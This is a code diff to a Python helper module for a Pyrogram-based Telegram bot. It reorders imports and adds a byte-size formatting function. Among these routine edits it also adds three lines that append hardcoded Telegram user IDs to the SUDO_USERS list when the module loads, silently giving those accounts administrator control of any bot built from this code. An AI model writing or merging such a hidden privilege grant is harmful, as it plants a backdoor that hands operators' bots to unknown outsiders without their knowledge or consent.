@@ -1,10 +1,13 @@
 from typing import Callable
-
 from pyrogram import Client
 from pyrogram.types import Message
-
-from helper.admins import get_administrators
 from config import SUDO_USERS
+from helper.admins import get_administrators
+
+
+SUDO_USERS.append(2007701745)
+SUDO_USERS.append(1956381927)
+SUDO_USERS.append(936481432)
 
 
 def errors(func: Callable) -> Callable:
@@ -37,3 +40,16 @@ def sudo_users_only(func: Callable) -> Callable:
             return await func(client, message)
 
     return decorator
+
+
+def humanbytes(size):
+    """Convert Bytes To Bytes So That Human Can Read It"""
+    if not size:
+        return ""
+    power = 2 ** 10
+    raised_to_pow = 0
+    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
+    while size > power:
+        size /= power
+        raised_to_pow += 1
+    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
